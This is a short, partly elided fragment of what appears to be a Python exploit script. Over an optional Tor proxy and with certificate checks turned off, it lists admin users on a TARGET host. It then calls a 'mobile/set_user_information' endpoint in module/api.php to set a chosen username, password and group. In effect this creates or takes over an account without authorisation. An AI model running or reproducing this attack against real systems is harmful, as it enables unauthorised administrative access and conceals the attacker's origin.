...
if __name__ == '__main__':
    ...
    s = requests.Session()
    if args.tor:
        s.proxies = {"http":"socks5://127.0.0.1:1089", "https": "socks5://127.0.0.1:1089"}
    ...
    for admin in get_admin_users(s):
        ...
        if args.create != None:
            ...
            r=s.post(f"{TARGET}/module/api.php?mobile/__construct", verify=False)
            r=s.post(f"{TARGET}/module/api.php?mobile/set_user_information", data={"groups":groups, "username":user,"operation":"0","password":password,"capacity":""}, verify=False)
